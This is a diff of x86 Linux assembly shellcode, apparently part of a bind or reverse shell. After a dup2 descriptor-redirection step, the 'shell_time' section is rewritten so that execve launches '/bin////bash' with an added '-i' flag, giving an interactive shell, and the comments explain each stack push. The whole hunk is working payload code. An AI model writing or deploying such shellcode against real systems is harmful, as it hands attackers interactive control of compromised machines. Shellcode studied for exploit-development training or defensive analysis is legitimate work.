@@ -91,29 +91,33 @@ redirect_fd:
 	mov al, 0x3f		; define __NR_dup2    63 (0x3f)
 	int 0x80		; call it
 
-shell_time:
 
-	; now it's time to launch our shell
-	; program using execve. I prefer
-	; /bin/bash we'll use /bin////bash
-	; execve is 0xb (11)
-	; int execve(const char *filename, char *const argv[],
+shelltime:
+
+        ; now it's time to launch our shell
+        ; program using execve. I prefer
+        ; /bin/bash we'll use /bin////bash
+        ; execve is 0xb (11)
+        ; int execve(const char *filename, char *const argv[],
         ;          char *const envp[])
 
 
-	xor eax, eax	; clean out eax
-	push eax	; need a null byte for execve parameters
-	push 0x68736162	; hsab
-	push 0x2f2f2f2f	; ////
-	push 0x6e69622f	; nib/ 
-	xor ebx, ebx	; clean out ebx, though may be unnecessary
-	mov ebx, esp	; save stack pointer in ebx
-	push eax	; push another null onto stack
-	mov edx, esp	; 0x00hsab////nib/0x00
-	push ebx	; points to 0x00hsab////nib/
-	mov ecx, esp	; store pointer to 0x00hsab////nib/ into ecx
-	mov al, 0xb	; execve
-	int 0x80	; call it	
+        xor eax, eax    	; clean out eax
+        push eax        	; need a null byte for execve parameters
+        push 0x68736162 	; hsab
+        push 0x2f2f2f2f 	; ////
+        push 0x6e69622f 	; nib/
+        mov ebx, esp    	; save stack pointer in ebx
+        push eax        	; Null onto stack
+        push word 0x692d        ; "-i" parameter to /bin/bash
+        mov esi, esp    	; save the argument pointer
+        push eax        	; null byte terminator
+        push esi        	; pointer to "-i" parameter to /bin/bash
+        push ebx        	; points to 0x00hsab////nib/
+        mov ecx, esp    	; store pointer to 0x00hsab////nib/ into ecx
+        xor edx, edx    	; NULL as last parameter
+        mov al, 0xb     	; execve
+        int 0x80        	; call it
 
 
 
